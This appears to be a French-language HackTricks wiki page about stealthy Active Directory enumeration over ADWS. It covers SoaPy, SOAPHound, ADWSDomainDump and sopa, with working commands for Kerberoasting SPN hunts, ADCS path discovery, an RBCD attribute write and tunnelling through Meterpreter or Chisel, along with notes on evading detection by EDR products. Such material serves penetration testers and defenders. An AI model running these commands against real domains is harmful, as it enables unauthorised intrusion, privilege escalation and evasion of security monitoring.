# Active Directory Web Services (ADWS) Enumeration & Stealth Collection

{{#include ../../banners/hacktricks-training.md}}

## What is ADWS?

Active Directory Web Services (ADWS) est **activé par défaut sur chaque Domain Controller depuis Windows Server 2008 R2** et écoute sur le port TCP **9389**. Malgré le nom, **aucun HTTP n'est impliqué**. Le service expose plutôt des données de type LDAP via une pile de protocoles propriétaires .NET de framing :

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Parce que le trafic est encapsulé dans ces trames SOAP binaires et transite sur un port peu commun, **l'énumération via ADWS est bien moins susceptible d'être inspectée, filtrée ou détectée par signature que le trafic LDAP classique/389 & 636**. Pour les opérateurs, cela signifie :

* Recon plus furtif – les blue teams se concentrent souvent sur les requêtes LDAP.
* Possibilité de collecter depuis des hôtes **non-Windows (Linux, macOS)** en tunnelant 9389/TCP via un proxy SOCKS.
* Les mêmes données que vous obtiendriez via LDAP (users, groups, ACLs, schema, etc.) et la possibilité d'effectuer des **writes** (par ex. `msDs-AllowedToActOnBehalfOfOtherIdentity` pour **RBCD**).

Les interactions ADWS sont implémentées via WS-Enumeration : chaque requête commence par un message `Enumerate` qui définit le filtre/attributs LDAP et retourne un GUID `EnumerationContext`, suivi d'un ou plusieurs messages `Pull` qui streament jusqu'à la fenêtre de résultats définie par le serveur. Les contexts expirent après ~30 minutes, donc les outils doivent soit paginer les résultats soit diviser les filtres (requêtes préfixes par CN) pour éviter de perdre l'état. Lorsqu'on demande des security descriptors, spécifiez le contrôle `LDAP_SERVER_SD_FLAGS_OID` pour omettre les SACLs, sinon ADWS supprime simplement l'attribut `nTSecurityDescriptor` de sa réponse SOAP.

> REMARQUE : ADWS est aussi utilisé par de nombreux outils RSAT GUI/PowerShell, donc le trafic peut se mêler à une activité d'administration légitime.

## SoaPy – Native Python Client

[SoaPy](https://github.com/logangoins/soapy) est une **réimplémentation complète de la pile de protocoles ADWS en Python pur**. Il construit les trames NBFX/NBFSE/NNS/NMF octet par octet, permettant la collecte depuis des systèmes de type Unix sans toucher au runtime .NET.

### Key Features

* Supporte le **proxying through SOCKS** (utile depuis des implants C2).
* Filtres de recherche fins identiques à LDAP `-q '(objectClass=user)'`.
* Opérations d'**écriture** optionnelles ( `--set` / `--delete` ).
* Mode de sortie **BOFHound** pour ingestion directe dans BloodHound.
* Option `--parse` pour prettify les timestamps / `userAccountControl` quand la lisibilité humaine est requise.

### Targeted collection flags & write operations

SoaPy est livré avec des switches curated qui répliquent les tâches de chasse LDAP les plus courantes via ADWS : `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, plus des réglages bruts `--query` / `--filter` pour des pulls personnalisés. Associez-les à des primitives d'écriture telles que `--rbcd <source>` (setting `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (SPN staging pour Kerberoasting ciblé) et `--asrep` (flip `DONT_REQ_PREAUTH` dans `userAccountControl`).

Example targeted SPN hunt that only returns `samAccountName` and `servicePrincipalName`:
```bash
soapy corp.local/alice:'Winter2025!'@dc01.corp.local \
--spns -f samAccountName,servicePrincipalName --parse
```
Utilisez le même hôte/identifiants pour exploiter immédiatement les découvertes : dump RBCD-capable objects with `--rbcds`, puis appliquez `--rbcd 'WEBSRV01$' --account 'FILE01$'` pour mettre en place une Resource-Based Constrained Delegation chain (voir [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md) pour le chemin complet d'abus).

### Installation (hôte de l'opérateur)
```bash
python3 -m pip install soapy-adws   # or git clone && pip install -r requirements.txt
```
## ADWSDomainDump – LDAPDomainDump via ADWS (Linux/Windows)

* Fork de `ldapdomaindump` qui remplace les requêtes LDAP par des appels ADWS sur TCP/9389 pour réduire les détections par signature LDAP.
* Effectue une vérification initiale d'accessibilité vers 9389 sauf si `--force` est passé (ignore la sonde si les scans de ports sont bruyants/filtrés).
* Testé contre Microsoft Defender for Endpoint et CrowdStrike Falcon avec bypass réussi dans le README.

### Installation
```bash
pipx install .
```
### Utilisation
```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```
La sortie typique enregistre le 9389 reachability check, l'ADWS bind et le dump start/finish :
```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```
## Sopa - Un client pratique pour ADWS en Golang

Similarly as soapy, [sopa](https://github.com/Macmod/sopa) implements the ADWS protocol stack (MS-NNS + MC-NMF + SOAP) in Golang, exposing command-line flags to issue ADWS calls such as:

* **Recherche et récupération d'objets** - `query` / `get`
* **Cycle de vie des objets** - `create [user|computer|group|ou|container|custom]` et `delete`
* **Modification d'attributs** - `attr [add|replace|delete]`
* **Gestion des comptes** - `set-password` / `change-password`
* et d'autres tels que `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]`, etc.

## SOAPHound – Collecte ADWS à haut volume (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) est un collecteur .NET qui maintient toutes les interactions LDAP à l'intérieur d'ADWS et produit du JSON compatible BloodHound v4. Il construit un cache complet de `objectSid`, `objectGUID`, `distinguishedName` et `objectClass` une seule fois (`--buildcache`), puis le réutilise pour des passages à haut volume `--bhdump`, `--certdump` (ADCS), ou `--dnsdump` (AD-integrated DNS) de sorte que seulement ~35 attributs critiques quittent le DC. AutoSplit (`--autosplit --threshold <N>`) segmente automatiquement les requêtes par préfixe CN pour rester en dessous du délai d'expiration EnumerationContext de 30 minutes dans les grandes forêts.

Flux de travail typique sur une VM d'opérateur jointe au domaine:
```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump \
--autosplit --threshold 1200 --nolaps \
-o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```
Les slots JSON exportés s'intègrent directement dans les workflows SharpHound/BloodHound — voir [BloodHound methodology](bloodhound.md) pour des idées de visualisation en aval. AutoSplit rend SOAPHound résilient sur des forêts de plusieurs millions d'objets tout en maintenant le nombre de requêtes inférieur à celui des captures de type ADExplorer.

## Stealth AD Collection Workflow

Le workflow suivant montre comment énumérer **les objets de domaine & ADCS** via ADWS, les convertir en JSON BloodHound et rechercher des chemins d'attaque basés sur des certificats — le tout depuis Linux :

1. **Tunnel 9389/TCP** depuis le réseau cible vers votre machine (p.ex. via Chisel, Meterpreter, SSH dynamic port-forward, etc.). Exportez `export HTTPS_PROXY=socks5://127.0.0.1:1080` ou utilisez les options `--proxyHost/--proxyPort` de SoaPy.

2. **Collecter l'objet racine du domaine :**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-q '(objectClass=domain)' \
| tee data/domain.log
```
3. **Collecter les objets liés à ADCS depuis le Configuration NC :**
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
-dn 'CN=Configuration,DC=ludus,DC=domain' \
-q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority) \\
(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
| tee data/adcs.log
```
4. **Convertir en BloodHound:**
```bash
bofhound -i data --zip   # produces BloodHound.zip
```
5. **Téléversez le ZIP** dans la BloodHound GUI et exécutez des requêtes cypher telles que `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c` pour révéler les chemins d'escalade de certificats (ESC1, ESC8, etc.).

### Écriture de `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)
```bash
soapy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
--set 'CN=Victim,OU=Servers,DC=ludus,DC=domain' \
msDs-AllowedToActOnBehalfOfOtherIdentity 'B:32:01....'
```
Combinez ceci avec `s4u2proxy`/`Rubeus /getticket` pour une chaîne complète **Resource-Based Constrained Delegation** (voir [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).

## Résumé des outils

| Objectif | Outil | Remarques |
|---------|------|-------|
| Énumération ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, lecture/écriture |
| Dump ADWS haute volumétrie | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, priorité au cache, modes BH/ADCS/DNS |
| Ingestion pour BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Convertit les logs SoaPy/ldapsearch |
| Compromission de certificats | [Certipy](https://github.com/ly4k/Certipy) | Peut être acheminé via le même SOCKS |
| Énumération ADWS et modifications d'objets | [sopa](https://github.com/Macmod/sopa) | Client générique pour interagir avec des points de terminaison ADWS connus - permet l'énumération, la création d'objets, les modifications d'attributs et les changements de mots de passe |

## Références

* [SpecterOps – Make Sure to Use SOAP(y) – An Operators Guide to Stealthy AD Collection Using ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
* [SoaPy GitHub](https://github.com/logangoins/soapy)
* [BOFHound GitHub](https://github.com/bohops/BOFHound)
* [ADWSDomainDump GitHub](https://github.com/mverschu/adwsdomaindump)
* [Microsoft – MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF specifications](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
* [IBM X-Force Red – Stealthy Enumeration of Active Directory Environments Through ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
* [FalconForce – SOAPHound tool to collect Active Directory data via ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)

{{#include ../../banners/hacktricks-training.md}}
